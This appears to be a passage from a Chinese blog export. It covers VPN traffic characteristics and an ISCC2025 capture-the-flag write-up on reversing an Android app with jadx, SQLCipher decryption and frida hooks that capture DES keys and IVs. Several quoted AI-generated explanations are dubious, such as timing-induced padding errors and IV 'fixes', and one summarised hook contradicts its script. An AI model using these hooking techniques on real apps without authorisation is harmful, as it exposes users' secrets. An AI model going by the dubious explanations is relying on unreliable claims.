TCP&#x2F;UDP。\n\nSOCKS5 vs. 常规 VPN 的核心区别\n\n\n特性\nSOCKS5 代理\n常规 VPN（如 OpenVPN&#x2F;WireGuard）\n\n\n\n工作层级\n会话层（代理 TCP&#x2F;UDP）\n网络层（TUN）或链路层（TAP）\n\n\n代理范围\n仅支持 SOCKS5 的应用\n全系统流量（自动接管）\n\n\n是否依赖虚拟网卡\n❌ 否\n✅ 是\n\n\n是否修改路由表\n❌ 否\n✅ 是\n\n\n是否支持 ICMP&#x2F;RAW\n❌ 否\n✅ 是\n\n\nDNS 泄漏风险\n⚠️ 可能泄漏（依赖应用配置）\n✅ 通常无泄漏（DNS 走隧道）\n\n\n适用场景\n灵活代理（如仅浏览器&#x2F;游戏）\n全局匿名&#x2F;企业远程访问\n\n\n对比dns泄露的问题定义: 通过查询dns获取ip,但是由于可能对应的dns服务没有通过代理进行,从而导致监管者发现通信链(访问了哪个网站)从而导致的泄露\n\n通过虚拟网卡通信的vpn对于所有的数据都会走虚拟网卡,包括dns请求也会走虚拟网卡,不会导致泄露\n\n代理型vpn,有可能没有设置全局代理导致部分dns流量通过正常网络进行,而没有通过代理\n\nwindows上的v2ray&#x2F;clash等软件的全局代理(没有开启tun模式)的情况是通过修改 Internet 选项 → 连接 → 局域网设置来实现的,而这个只有http代理,所以一定会造成dns泄露\n但是如果使用tun模式记忆库避免,但就变成了特殊的代理vpn,依赖代理协议进行加密,但是处理的数据实在传输层,不会造成dns泄露\n\n\n\nvpn协议向大佬学习\n大佬个人重新实现vpn: 南京大学 SSL VPN 协议分析与实现\n在这篇文章中为了解密tls流量通过火绒剑找socket最多的的进程来发现实现vpn的进程,然后通过frida hook该进程(he0xwhale&#x2F;ssl_logger: Decrypts and logs a process’s SSL traffic.)解密TLS流量然后就可以查看vpn会话过程\n\nvpn情报信息搜集: VPN情报收集的常见方法与技术解析_YNXZ的技术博客_51CTO博客\n\n不同vpn比较(有点ai味): VPN概述+VRF - 知乎\n\n\n不同vpn的流量特征\n\n\nVPN 类型\n默认端口\n协议特征\n\n\n\nOpenVPN\nUDP 1194\nTLS 握手 + Application Data\n\n\nIPSec (IKEv1)\nUDP 500&#x2F;4500\nISAKMP + ESP\n\n\nWireGuard\nUDP 51820\n纯加密 UDP，无握手\n\n\nL2TP&#x2F;IPSec\nUDP 1701 + ESP\nL2TP 控制消息 + ESP 加密\n\n\n流量模式\n\nOpenVPN&#x2F;IPSec：有明显的握手过程（Client Hello、IKE SA 协商）。\nWireGuard：无握手，仅小尺寸 UDP 包（加密数据 + Keepalive）。\nL2TP&#x2F;IPSec：先有 L2TP 控制消息，后接 ESP 加密数据。\n\n解密模式\n\nOpenVPN：若获取 TLS 密钥，可解密 Application Data。\nIPSec：需导入预共享密钥或证书解密 ESP 流量。\nWireGuard：几乎无法解密（无握手，静态密钥加密）。\n\nVPN 流量的一般特征无论哪种 VPN，在 Wireshark 中通常具有以下共同特点：\n\n加密的载荷：原始数据（如 HTTP、DNS）被加密，无法直接解析内容。\n固定的目标 IP&#x2F;端口：VPN 流量通常指向固定的服务器 IP 和端口（如 OpenVPN 默认 1194/UDP）。\n协议特征：不同 VPN 协议有独特的握手、保活机制，可在 Wireshark 中识别。\n\nOpenVPN\n使用默认端口udp 1194\n使用TLS加密(类似HTTPS),流量显示为TLSv1.2 / 1.3\n握手阶段可见Client Hello / Server Hello(未加密部分)\n数据传输阶段全部加密,显示为Application Data\n\nIPSec VPN\n版本: IKEv1&#x2F;IKEv2\n阶段 1（IKE 协商）：\n使用 UDP 500 或 UDP 4500（NAT-T）。\n可看到 ISAKMP 协议（IKE 协商包），包含 SA（安全关联）提议。\n\n\n阶段 2（ESP 加密）：\n流量封装在 ESP(proto == 50) 协议中，Wireshark 显示为 Encrypted Payload。\n除非导入预共享密钥&#x2F;证书，否则无法解密。\n\n\n\nWireGuard\n端口: UDP 51820\n使用 ChaCha20&#x2F;Poly1305 加密，所有流量均加密。\n无显式握手过程，仅定期发送 Keepalive 包（短小的 UDP 包）。\n在 Wireshark 中仅显示为 UDP 流量，无协议标识。\n\nL2TP&#x2F;IPSec\nUDP 1701 + ESP\nL2TP 控制消息（未加密）：\n使用 UDP 1701，可见 L2TP 协议头（如 SCCRQ、SCCRP 等控制消息）。\n\n\n数据部分：\n实际数据通过 ESP 加密，与 IPSec 相同。\n\n\n\n代理型vpn\n\n\n特征\nOpenVPN (TLS Mode)\nV2Ray (TLS + WebSocket&#x2F;HTTP&#x2F;VMess)\n\n\n\n协议基础\n纯 TLS，类似 HTTPS\nTLS 作为传输层，上层协议自定义（如 VMess、WebSocket）\n\n\n默认端口\nTCP/UDP 1194（常见）\n通常 TCP 443（伪装 HTTPS）\n\n\n握手特征\n标准 TLS 握手（Client&#x2F;Server Hello）\nTLS 握手后，上层协议有独特特征（如 VMess 头部）\n\n\n数据包模式\n持续加密流量，无额外协议头\nTLS 解密后可见 VMess&#x2F;WebSocket 协议头\n\n\n(1) JA3 指纹检测\n\nOpenVPN：JA3 指纹与普通 TLS 客户端不同（如自定义 OpenVPN 实现）。\nV2Ray：可能模仿浏览器 JA3 指纹（如 Chrome&#x2F;Firefox）。\n\n(2) 流量时序分析\n\nOpenVPN：流量较平稳（VPN 隧道保持活跃）。\nV2Ray：可能呈现 突发性（如 WebSocket 按需传输）。\n\n(3) 解密 TLS（若可能）\n\n使用 服务器私钥解密 TLS，直接观察上层协议：\nOpenVPN → 仍为加密 IP 包。\nV2Ray → 可见 VMess&#x2F;WebSocket 协议头。\n\n\n\n","categories":["协议学习"],"tags":["vpn"]},{"title":"iscc2025_邦布出击","url":"/2025/05/11/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/ISCC2025/%E9%82%A6%E5%B8%83%E5%87%BA%E5%87%BB/","content":"解题思路\n下载apk,打开发现除了一个输入窗口,还有一个框,点击进去是一个什么[ 邦布图鉴提交处 ],有一个BBTUJAIN的标识\n\n\n那么就使用jadx打开压缩包搜索这个BBTUJAIN可以找到这个\n\n&#x27;鲨牙布&#x27;, &#x27;S&#x27;,&#x27;VVcwNWRt&#x27;  --&gt;  不知道是啥&#x27;左轮布&#x27;, &#x27;S&#x27;,&#x27;UkhhSEJp&#x27;   --&gt;  不知道是啥&#x27;格列佛探员&#x27;, &#x27;S&#x27;,&#x27;UjNjOQ==&#x27;   --&gt;  不知道是啥&#x27;绳网情报&#x27;, &#x27;SSR&#x27;,&#x27;VGhyZWUgZGVjcnlwdGlvbnM=&#x27;  --&gt;   Three decryptions&#x27;f0LaG?&#x27;, &#x27;SSS&#x27;,&#x27;e2ZsYWcwLm8/a2V5by4wfWNjc2w=&#x27;  --&gt;  &#123;flag0.o?keyo.0&#125;ccsl\n\n\n\n把前三个拼起来base64炒三次: VVcwNWRtUkhhSEJpUjNjOQ== –&gt;  Boothill\n试了下这玩意不是flag,那就是key, [o.0 | 0.o ]你妈原来是大眼瞪小眼\n\n\n题目中还给了一个数据库sqlite的形式,但是似乎打不开(DataGrip),所以猜测这玩意就是加密的key, 单独提出来(SqlCiper解密手段)\n\n对3的unicode进行解码 –&gt; \\ahe falg is false but the key is True\n好吧发现个key: A7bCdEfGhIjKlMnO\n\n搜索这个blowfish发现一个函数,有个hiddenString:\nCWrv7qxLTdlwvWoMVxDfkoRy+d5GuXiN\n\n\n\npublic class b &#123;    private static String hiddenString = &quot;CWrv7qxLTdlwvWoMVxDfkoRy+d5GuXiN&quot;;    public static String b() &#123;        try &#123;            HashMap hashMap = new HashMap();            HashMap hashMap2 = new HashMap();            hashMap2.put(&quot;hiddenString&quot;, hiddenString);            hashMap.put(&quot;level1&quot;, hashMap2);            HashMap hashMap3 = new HashMap();            hashMap3.put(&quot;level2&quot;, hashMap);            Field declaredField = b.class.getDeclaredField(&quot;hiddenString&quot;);            declaredField.setAccessible(true);            String str = (String) declaredField.get(null);            return (String) ((Map) ((Map) hashMap3.get(&quot;level2&quot;)).get(&quot;level1&quot;)).get(&quot;hiddenString&quot;);        &#125; catch (Exception e) &#123;            e.printStackTrace();            return null;        &#125;    &#125;    public static String c() &#123;        return &quot;&quot;;    &#125;    public static String d() &#123;        return &quot;Blowfish/ECB/PKCS5Padding&quot;;    &#125;&#125;\n\n\n\n使用blowfish进行解密\n得到WTF6I0EyYiRDM2QlRTRmXkc1aA== –&gt; Y1z#A2b$C3d%E4f^G5h\n\n\n查看函数b()的引用发现一个函数a()的引用,发现Jformat\npublic boolean Jformat(String str) &#123;    if (str.length() &gt;= 7 &amp;&amp; str.substring(0, 5).equals(&quot;ISCC&#123;&quot;) &amp;&amp; str.charAt(str.length() - 1) == &#x27;&#125;&#x27;) &#123;        try &#123;            String a = a.a();            Log.d(&quot;str1&quot;, &quot;des加密明文: &quot; + a);            try &#123;                String encrypt = new DESHelper().encrypt(a, &quot;WhItenet&quot;, getiv());                Log.d(&quot;DEBUG_RES&quot;, &quot;加密结果 res: &quot; + encrypt);                return str.substring(5, str.length() - 1).equals(encrypt);            &#125; catch (Exception e) &#123;                throw new RuntimeException(e);            &#125;        &#125; catch (Exception e2) &#123;            throw new RuntimeException(e2);        &#125;    &#125;    return false;&#125;\n\n还差一个getiv()静态分析分了个寂寞,初步判断是个硬编码, ai启动搞个fridafrida动态调试出来\n执行得到IV： IbaovdjvbskPlzjhwl\n\nDES加密得到flag\nISCC&#123;CO1uvILOscxApRz7t/lVGHTN+DL8Ctob&#125;\n\n\n\n\n\n\n\n\n如何打开SqlCipher加密的数据库直接使用sqlcipher导出没有密码的版本sqlcipher - github\n建议在linux中打开,可以自己clone编译,也可以直接使用命令安装\nsudo apt install sqlcipher\n\n\n\nai启动,需要注意的是这里地方的兼容模式需要调整为3,因为加密的时候的版本是旧的3版本,但是解密版本较新,默认用的兼容模式是4,所以需要手动设置为3\n这个方式是新设置一个空的没有加密的数据库导出\n-- 1. 输入密码解密（使用你已知的正确密码）PRAGMA key = &#x27;Boothill&#x27;;-- 2. 设置兼容模式（如果需要）PRAGMA cipher_compatibility = 3;  -- 可尝试1-4-- 3. 创建并附加一个新的未加密数据库ATTACH DATABASE &#x27;plain.db&#x27; AS plaintext KEY &#x27;&#x27;;-- 4. 导出数据到未加密数据库SELECT sqlcipher_export(&#x27;plaintext&#x27;);-- 5. 分离新数据库DETACH DATABASE plaintext;-- 6. 退出.quit\n\n\n\n\n然后导出到DataGrip中可以发现\n\nDataGrip打开SQLCipher方法网上找了一下发现给sqlite加密的一般是SqlCiphergithub,还真有人问过这个DataGrip如何如何使用SqlCipher的问题: How to open SQLCipher passwrd protected file in Datagrip – IDEs Support (IntelliJ Platform) | JetBrains\n\n去下载对应的sqlite-jdbc-crypt也就是一个sqlite的启动器github\n\n然后在DataGrip的 File -&gt; New -&gt; Driver 来新建一个User Drivers,给他取名叫做SQLCipher(其实你爱叫啥叫啥关我屁事),然后具体设置\n\n但是这个官方的介绍没有任何意义,但是抛砖引玉,下面有了很多热心网友的评价,我也借此学习了一下[DataGrip URL template的命名规则](#DataGrip URL template的命名规则)\n\n佬Shz的思路\nI succeed with Yuriy Vinogradov‘s solution. But, in my case, additionally I needed to add slf4j-api-1.7.36.jar file(which is mentioned on the Usage part of the sqlite-jdbc-crypt) to the Driver Files list. After added the file path, I can select org.sqlite.JDBC class and connect to db with “jdbc:sqlite:&#x2F;path&#x2F;to&#x2F;db?cipher&#x3D;sqlcipher&amp;key&#x3D;{key phrase}&amp;legacy&#x3D;4” this url format (Actually i didn’t set the url templates)\nI hope my comments can help save your time.\n\n可能是有用的,但是在这里屁用没有\n\n\nDataGrip URL template的命名规则先贴个图\n\n在这篇学习中,我似乎搞懂了这个URL templates是干嘛的\njdbc:sqlite:/path/to/my/encrypted.db?cipher=sqlcipher&amp;key=thepassword&amp;legacy=3\\jdbc:sqlite:file:&#123;file&#125;?cipher=aes256cbc&amp;key=&#123;password&#125;&amp;cipher_compatibility=3\n\n实际上对于DataGrip来说,连接数据库的操作还是要靠驱动(driver file)*.jar来执行,所以也就是说,前面花里胡哨的配置都是前端的配置,真正在起到作用的还是这个sqlite-jdbc-crypt-3.49.10.jar在执行真正的连接作用\n那么对于URL templates来说JDBC URL 是整个连接的核心 —— 它告诉驱动程序连接哪个数据库、在哪里、用什么参数、是否启用密码、兼容模式等。\n在DataGrip中提供了几个模版: &#123;file&#125;,&#123;user&#125;,&#123;password&#125;,虽然{user},{password}会成对出现(这是由于DataGrip的GUI设计导致的),但是如果URL templates中没有对于{user}的引用,那么实际上是不会传入任何参数的,比如在这个题目中就只需要password,那么对于输入User来说,就是输入什么都行,因为他不会作为参数传递给驱动\nfrida动态调试frida环境配置\n设备: 小米8青春版(已经解锁)windows: 为frida建立虚拟环境adb: 有线连接,调试安卓\n\n环境配置pycharm新建一个project之后安装以下库,挂梯子更快\npip install fridapip install frida-tools\n\n手机安装frida环境\n查看手机cpu版本有线连接之后打开adb调试,打开开发者模式,打开USB调试电脑端cmd在adb.exe存在的目录在使用命令\nadb shellgetprop ro.product.cpu.abi #查看cpu版本&gt;&gt; arm64-v8a # 通常大多数手机(包括演示设备)\n\n查找amd64对应的frida版本\nReleases · frida&#x2F;frida\n需要注意的是,这里下载的是对应版本的frida-server,下载到的文件格式应该是这个样子的frida-server-16.7.14-android-arm64.xz,需要在release里面展开查询,不要下载错咯\n\n\n\n(解压后的文件)推送到手机的/data/local/tmp上去\nadb push frida-server-16.7.14-android-arm64 /data/local/tmp\n\n\n然后再执行\nsu # 注意在手机上授权cd /data/local/tmpmv frida-server-16.7.14-android-arm64 fridachmod 777 frida# 然后运行./frida\n\n在安装了frida环境的python环境中起一个powershell(直接在pycharm中也行)执行\nfrida-ps -U\n\n\n\n注意:\n需要注意的是,需要在运行./frida的情况下才可以运行frida-ps -U才能查看到对应的内容\n\n\n通过adb进行文件推送termux方法\n/data/data/com.termux/files/home/storage/shared\n\n\n\n原生文件管理方法\n/storage/emulated/0\n\n运行手机上\nfrida -U -f com.example.mobile02 -l frida_script.js --runtime=v8\n\n通过adb进行安装软件adb install &quot;D:\\test file\\test.apk&quot;\n\n\n\n\n\n动态调试解题过程直接上payload吧这个版本是网上找的版本\nJava.perform(function() &#123;    try &#123;        var cls1 = Java.use(&quot;com.example.mobile01.DESHelper&quot;);        cls1.encrypt.implementation = function(data, key, iv) &#123;            console.log(&quot;[*] DESHelper.encrypt() called!&quot;);            console.log(&quot; Plaintext (from a.a()): &quot; + data);            console.log(&quot; Key: &quot; + key);            console.log(&quot; IV (from getiv()): &quot; + iv);            var enc_data = this.encrypt(data, key, iv);            console.log(&quot; Encrypted Result (Ciphertext): &quot; + enc_data);            console.log(&quot; &gt;&gt;&gt; Potential Flag Middle Part: &quot; + enc_data);            console.log(&quot; &gt;&gt;&gt; Likely Full Flag: ISCC&#123;&quot; + enc_data + &quot;&#125;&quot;);            return enc_data;        &#125;;        console.log(&quot;[+] Hooked com.example.mobile01.DESHelper.encrypt()&quot;);    &#125; catch (err) &#123;        console.error(&quot;[-] Failed to hook DESHelper.encrypt: &quot; + err);    &#125;    try &#123;        var cls2 = Java.use(&quot;com.example.mobile01.a&quot;);        cls2.a.implementation = function() &#123;            var res = this.a();            console.log(&quot;[*] com.example.mobile01.a.a() called, returned: &quot; + res);            return res;        &#125;;        console.log(&quot;[+] Hooked com.example.mobile01.a.a()&quot;);    &#125; catch (err) &#123;        console.error(&quot;[-] Failed to hook com.example.mobile01.a.a(): &quot; + err);    &#125;    try &#123;        var cls3 = Java.use(&quot;com.example.mobile01.MainActivity&quot;);        cls3.getiv.implementation = function() &#123;            var iv_val = this.getiv();            console.log(&quot;[*] MainActivity.getiv() called, returned: &quot; + iv_val);            return iv_val;        &#125;;        console.log(&quot;[+] Hooked com.example.mobile01.MainActivity.getiv()&quot;);    &#125; catch (err) &#123;        console.error(&quot;[-] Failed to hook MainActivity.getiv: &quot; + err);    &#125;    try &#123;        var cls4 = Java.use(&quot;com.example.mobile01.MainActivity&quot;);        cls4.Jformat.implementation = function(inp) &#123;            console.log(&quot;[*] MainActivity.Jformat() called with input: &quot; + inp);            var res = this.Jformat(inp);            console.log(&quot; Jformat result (boolean): &quot; + res);            return res;        &#125;        console.log(&quot;[+] Hooked com.example.mobile01.MainActivity.Jformat()&quot;);    &#125; catch (err) &#123;        console.error(&quot;[-] Failed to hook MainActivity.Jformat(): &quot; + err);    &#125;&#125;);\n\n\n\n这个版本是ai修改过的 \nJava.perform(function () &#123;    // 1. 初始化检查    console.log(&quot;[*] Starting hooks installation...&quot;);    // 2. DESHelper 加密监控    var DESHelper = Java.use(&quot;com.example.mobile01.DESHelper&quot;);    DESHelper.encrypt.implementation = function (data, key, iv) &#123;        console.log(`        [DES] Encrypt called        Data: $&#123;data&#125; ($&#123;data ? data.length : 0&#125; bytes)        Key: $&#123;key&#125; ($&#123;key ? key.length : 0&#125; bytes)        IV: $&#123;iv&#125; ($&#123;iv ? iv.length : 0&#125; bytes)        `);        // 记录原始参数        var backup = &#123; data: data, key: key, iv: iv &#125;;        try &#123;            var result = this.encrypt(data, key, iv);            console.log(`[DES] Success: $&#123;result&#125;`);            return result;        &#125; catch (e) &#123;            console.error(`[DES] Failed: $&#123;e&#125;`);            // 尝试修复常见问题            if (e.toString().includes(&quot;BadPadding&quot;)) &#123;                console.log(&quot;[!] Attempting IV fix...&quot;);                var fixedIV = &quot;01234567&quot;; // 示例固定IV                return this.encrypt(data, key, fixedIV);            &#125;            throw e;        &#125;    &#125;;    // 3. 关键方法监控    var MainActivity = Java.use(&quot;com.example.mobile01.MainActivity&quot;);    // getiv() 增强版    MainActivity.getiv.implementation = function () &#123;        var iv = this.getiv();        console.log(`[IV] Current IV: $&#123;iv&#125; ($&#123;iv ? iv.length : 0&#125; bytes)`);        // 验证IV有效性        if (!iv || iv.length !== 8) &#123;            console.error(&quot;[IV] Invalid IV detected!&quot;);            return &quot;00000000&quot;; // 返回安全值        &#125;        return iv;    &#125;;    // Jformat() 安全增强    MainActivity.Jformat.implementation = function (input) &#123;        console.log(`[Jformat] Input: $&#123;input&#125;`);        // 获取加密环境状态        var iv = this.getiv();        console.log(`[Jformat] Using IV: $&#123;iv&#125;`);        try &#123;            var result = this.Jformat(input);            console.log(`[Jformat] Success: $&#123;result&#125;`);            return result;        &#125; catch (e) &#123;            console.error(`[Jformat] Error: $&#123;e&#125;\\n$&#123;e.stack&#125;`);            // 应急处理方案            if (e.toString().includes(&quot;BadPadding&quot;)) &#123;                console.log(&quot;[!] Attempting input fix...&quot;);                return this.Jformat(input.substring(0, 4)); // 尝试缩短输入            &#125;            return false;        &#125;    &#125;;    console.log(&quot;[√] All hooks installed successfully&quot;);&#125;);\n\n\n\n出现的问题闪退实际上使用时候出现了一大堆问题, 对于这个函数一调用就会直接闪退,确定的逻辑主要是在app中输入flag的时候,如果不按照格式ISCC&#123;.*&#125;那就是正常报错,什么问题都不会出现. 但是如果当输入了正确的格式了, 那就立刻会发生闪退, 这个问题在我换了两台root真机,一台雷电模拟器都没有得到解决(实际上在最开始的小米8青春版上是可以正常报错的,但是我用frida去hook了几次,他就破费了,后面是稳定闪退)\npublic boolean Jformat(String str) &#123;    if (str.length() &gt;= 7 &amp;&amp; str.substring(0, 5).equals(&quot;ISCC&#123;&quot;) &amp;&amp; str.charAt(str.length() - 1) == &#x27;&#125;&#x27;) &#123;        try &#123;            String a = a.a();            Log.d(&quot;str1&quot;, &quot;des加密明文: &quot; + a);            try &#123;                String encrypt = new DESHelper().encrypt(a, &quot;WhItenet&quot;, getiv());                Log.d(&quot;DEBUG_RES&quot;, &quot;加密结果 res: &quot; + encrypt);                return str.substring(5, str.length() - 1).equals(encrypt);            &#125; catch (Exception e) &#123;                throw new RuntimeException(e);            &#125;        &#125; catch (Exception e2) &#123;            throw new RuntimeException(e2);        &#125;    &#125;    return false;&#125;\n\n\n\n尝试hookgetiv()鬼知道是啥动静,我需要的值就是getiv()的返回值,那么我现在大概就需要去hook他获取他的返回值,于是\njadx中复制frida尝试hookgetiv()片段\nlet MainActivity = Java.use(&quot;com.example.mobile01.MainActivity&quot;);MainActivity[&quot;getiv&quot;].implementation = function () &#123;    console.log(`MainActivity.getiv is called`);    let result = this[&quot;getiv&quot;]();    console.log(`MainActivity.getiv result=$&#123;result&#125;`);    return result;&#125;;\n\n但是问题就出现了啊, 就一直报错, 鬼知道是什么动静, 一直闪退,根本无法调试, 我让ai写的防止这个getiv()返回的加解密值不一样导致的闪退情况, 尝试去写入一个安全值了, 但是也是无济于事\nai给出的常见闪退原因\n线程问题\n\n参数&#x2F;返回值类型不匹配\n\n反调试检测\n\n\nai给出的常见闪退应对方法\n方法1：不调用原始方法(绕过这个方法) 重新定义注入直接返回一个定值\nMainActivity[&quot;getiv&quot;].implementation = function () &#123;    console.log(&quot;绕过原始方法调用&quot;);    return 12345; // 返回模拟值&#125;;\n\n方法2：修改返回值\nMainActivity[&quot;getiv&quot;].implementation = function () &#123;    let result = this[&quot;getiv&quot;]();    console.log(&quot;原始返回值:&quot;, result);    return result + 1; // 修改返回值&#125;;\n\n当然根据这些方法尝试之后都没用\n尝试hookDESHelper()尝试向前分析可以发现调用了这个函数DESHelper(), 那来都来了, hook一下吧\nString encrypt = new DESHelper().encrypt(a, &quot;WhItenet&quot;, getiv());\n\n在jadx中复制一下frida片段, 看看能不能获取调用\nlet DESHelper = Java.use(&quot;com.example.mobile01.DESHelper&quot;);DESHelper[&quot;$init&quot;].overload().implementation = function () &#123;    console.log(`DESHelper.$init is called`);    this[&quot;$init&quot;]();&#125;;\n\n\n\n但是如果直接这样执行的话会出问题,会直接去干扰加解密导致直接闪退报错, 所以需要具体的DESHelper这个类, 保证不去干扰加密的执行过程, 只去获取中间变量\npublic class DESHelper &#123;    private static final String ALGORITHM = &quot;DES/CBC/PKCS5Padding&quot;;    private static final String KEY_ALGORITHM = &quot;DES&quot;;    private IvParameterSpec ivParameterSpec;    private SecretKeySpec secretKey;    public DESHelper() &#123;    &#125;    public DESHelper(String str, String str2) &#123;        this.secretKey = new SecretKeySpec(process(str), KEY_ALGORITHM);        this.ivParameterSpec = new IvParameterSpec(process(str2));    &#125;    private byte[] process(String str) &#123;        byte[] bArr = new byte[8];        byte[] bytes = str.getBytes();        for (int i = 0; i &lt; 8; i++) &#123;            if (i &lt; bytes.length) &#123;                bArr[i] = bytes[i];            &#125; else &#123;                bArr[i] = 0;            &#125;        &#125;        return bArr;    &#125;    public String encrypt(String str, String str2, String str3) throws Exception &#123;        SecretKeySpec secretKeySpec = new SecretKeySpec(process(str2), KEY_ALGORITHM);        IvParameterSpec ivParameterSpec = new IvParameterSpec(process(str3));        Cipher cipher = Cipher.getInstance(ALGORITHM);        cipher.init(1, secretKeySpec, ivParameterSpec);        return Base64.encodeToString(cipher.doFinal(str.getBytes(&quot;UTF-8&quot;)), 0);    &#125;    public String decrypt(String str, String str2, String str3) throws Exception &#123;        SecretKeySpec secretKeySpec = new SecretKeySpec(process(str2), KEY_ALGORITHM);        IvParameterSpec ivParameterSpec = new IvParameterSpec(process(str3));        Cipher cipher = Cipher.getInstance(ALGORITHM);        cipher.init(2, secretKeySpec, ivParameterSpec);        return new String(cipher.doFinal(Base64.decode(str, 0)), &quot;UTF-8&quot;);    &#125;&#125;\n\n按照这个类让ai编写\nai编写代码Java.perform(function() &#123;    try &#123;        const DESHelper = Java.use(&quot;com.example.mobile01.DESHelper&quot;);        // Hook 无参构造函数        DESHelper.$init.overload().implementation = function() &#123;            console.log(&quot;\\n[DESHelper] Constructor called: $init()&quot;);            const result = this.$init();            console.log(&quot;[DESHelper] Constructor completed&quot;);            return result;        &#125;;        // Hook 带参构造函数        DESHelper.$init.overload(&#x27;java.lang.String&#x27;, &#x27;java.lang.String&#x27;).implementation = function(str, str2) &#123;            console.log(&#x27;\\n[DESHelper] Constructor called: $init(str, str2)&#x27;);            console.log(&#x27;[+] Arg1 (key):&#x27;, str);            console.log(&#x27;[+] Arg2 (iv):&#x27;, str2);            const result = this.$init(str, str2);            console.log(&#x27;[DESHelper] Constructor completed&#x27;);            return result;        &#125;;        // Hook encrypt 方法        DESHelper.encrypt.overload(&#x27;java.lang.String&#x27;, &#x27;java.lang.String&#x27;, &#x27;java.lang.String&#x27;).implementation = function(str, str2, str3) &#123;            console.log(&#x27;\\n[DESHelper] encrypt() called&#x27;);            console.log(&#x27;[+] Plaintext:&#x27;, str);            console.log(&#x27;[+] Key:&#x27;, str2);            console.log(&#x27;[+] IV:&#x27;, str3);            try &#123;                const result = this.encrypt(str, str2, str3);                console.log(&#x27;[+] Result (Base64):&#x27;, result);                return result;            &#125; catch (e) &#123;                console.error(&#x27;[!] Encrypt error:&#x27;, e);                throw e; // 保持原有异常行为            &#125;        &#125;;        // Hook decrypt 方法        DESHelper.decrypt.overload(&#x27;java.lang.String&#x27;, &#x27;java.lang.String&#x27;, &#x27;java.lang.String&#x27;).implementation = function(str, str2, str3) &#123;            console.log(&#x27;\\n[DESHelper] decrypt() called&#x27;);            console.log(&#x27;[+] Ciphertext (Base64):&#x27;, str);            console.log(&#x27;[+] Key:&#x27;, str2);            console.log(&#x27;[+] IV:&#x27;, str3);            try &#123;                const result = this.decrypt(str, str2, str3);                console.log(&#x27;[+] Decrypted:&#x27;, result);                return result;            &#125; catch (e) &#123;                console.error(&#x27;[!] Decrypt error:&#x27;, e);                throw e;            &#125;        &#125;;        // Hook 内部 process 方法（可选）        DESHelper.process.overload(&#x27;java.lang.String&#x27;).implementation = function(str) &#123;            console.log(&#x27;\\n[DESHelper] process() called&#x27;);            console.log(&#x27;[+] Input:&#x27;, str);            const result = this.process(str);            console.log(&#x27;[+] Processed bytes:&#x27;, byteArrayToString(result));            return result;        &#125;;        console.log(&#x27;[+] DESHelper hooks installed successfully&#x27;);    &#125; catch (e) &#123;        console.error(&#x27;[!] Hook error:&#x27;, e);    &#125;&#125;);// 辅助函数：将 byte[] 转为可读字符串function byteArrayToString(byteArray) &#123;    return Array.from(byteArray, byte =&gt; &#123;        return (&#x27;0&#x27; + (byte &amp; 0xFF).toString(16)).slice(-2);    &#125;).join(&#x27; &#x27;);&#125;\n\n但是出现了报错然后闪退\nSpawned `com.example.mobile01`. Resuming main thread!               [MI 8 Lite::com.example.mobile01 ]-&gt; [+] DESHelper hooks installed successfullyProcess crashed: javax.crypto.BadPaddingException: pad block corrupted\n\n这就很sad了\n\n这个错误 (BadPaddingException: pad block corrupted) 表明 DES 加密&#x2F;解密过程中出现了问题，通常是由于 密钥、IV 或数据被意外修改 导致的。你的 Hook 代码可能 间接干扰了加密流程，即使你没有直接修改返回值。\n\n很好!\n为什么刚才的代码会出现报错?\nHook 时机问题如果 Hook 代码在 DES 操作过程中执行了额外操作（如日志打印），可能会 延迟加密&#x2F;解密流程，导致数据异常。某些 Android 设备对加密操作 时间敏感，延迟可能导致填充错误。\n参数或返回值被修改即使你没有显式修改数据，Frida 的 Hook 机制可能会 临时改变内存状态，导致加密&#x2F;解密失败。\n多线程竞争如果 DESHelper 被多个线程调用，Hook 代码可能会导致 线程同步问题，进而引发 BadPaddingException。\n当然通过上帝之眼发现了这个iv值就是不对长度不对导致的直接报错,但是要如何通过动态调试发现呢\n好问题我没解决,在这里插个眼\n\n为什么最上面的ai修正payload就可以执行了使用了多层防御式编程设计(什么鸟)，针对加密流程的每个关键环节都做了智能处理。以下是对其工作原理的深度解析：\n\n核心模块实际上就是对那些关键函数进行了重写(不叫这个名字,但是是这个作用),然后在执行之前检查, 对于不符合规范的强行修正\n\n\n\n特性\n传统重写 (Override)\nFrida Hook\n\n\n\n修改位置\n类定义文件\n运行时内存\n\n\n作用域\n全局永久生效\n仅当前进程有效\n\n\n原始方法访问\n需通过super调用\n通过this.method.call()访问\n\n\n线程安全性\n依赖Java同步机制\n原子指针替换保证安全\n\n\n兼容性\n需重新编译\n即时生效，无视加固&#x2F;混淆\n\n\n\nDES加密监控（关键突破点）\n\nDESHelper.encrypt.implementation = function(data, key, iv) &#123;    // ① 完整参数捕获    console.log(`Data: $&#123;data&#125;, Key: $&#123;key&#125;, IV: $&#123;iv&#125;`);         // ② 异常处理框架    try &#123;        // ③ 原始调用保持流程完整        return this.encrypt(data, key, iv);     &#125; catch (e) &#123;        // ④ 智能修复机制        if (e.includes(&quot;BadPadding&quot;)) &#123;            return this.encrypt(data, key, &quot;01234567&quot;); // 强制修正IV        &#125;    &#125;&#125;\n\n为什么有效？\n\n不破坏调用链：通过this.encrypt()维持原始方法调用\n错误隔离：异常被控制在当前方法内，不会导致全局崩溃\n自动修复：检测到填充错误时自动使用标准IV\n\n\nIV生成监控（安全关键）\n\nMainActivity.getiv.implementation = function() &#123;    let iv = this.getiv(); // 原始调用    if (!iv || iv.length !== 8) &#123; // 严格校验        console.error(&quot;Invalid IV!&quot;);        return &quot;00000000&quot;; // 安全值    &#125;    return iv;&#125;\n\n防御策略：\n\n长度强制校验：确保返回8字节IV\n默认值保护：异常时返回全零IV避免崩溃\n日志追踪：记录原始值用于调试\n\n\n业务逻辑监控（Jformat）\n\nMainActivity.Jformat.implementation = function(input) &#123;    try &#123;        return this.Jformat(input);     &#125; catch (e) &#123;        return input.substring(0,4); // 输入截断保护    &#125;&#125;\n\n熔断机制：\n\n输入过滤：异常时自动缩减输入长度\n业务降级：返回false避免连锁崩溃\n\n关键技术点\n方法签名处理\n\n使用.implementation而非.overload()自动适配重载\n避免因签名不匹配导致的Hook失效\n\n\n上下文保持\n// 正确保留this上下文this.encrypt(...) // 而不是 DESHelper.encrypt(...)\n\n错误处理金字塔\n\ngraph TD    A[原始调用] --&gt; B&#123;成功?&#125;    B --&gt;|是| C[返回结果]    B --&gt;|否| D[识别错误类型]    D --&gt; E[IV错误?]    E --&gt;|是| F[修正IV重试]    E --&gt;|否| G[输入错误?]    G 